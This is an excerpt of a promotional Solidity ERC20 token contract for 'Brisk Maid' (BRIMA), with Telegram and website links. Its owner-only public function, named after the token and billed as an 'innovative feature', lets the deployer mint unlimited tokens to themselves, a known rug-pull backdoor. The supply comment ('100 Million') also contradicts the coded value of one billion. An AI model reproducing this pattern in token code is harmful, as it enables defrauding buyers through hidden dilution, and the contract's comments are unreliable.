...
//
// $BriskMaid proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/BriskMaid
//  📱Website :: https://BriskMaid.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BriskMaid(uint256 amount) public onlyOwner {
 _BriskMaid(msg.sender, amount);
    }
    ...
    function _BriskMaid(address account, uint256 amount) internal virtual {
...
contract $BriskMaid is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Brisk Maid", "BRIMA") {
     _BriskMaid(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}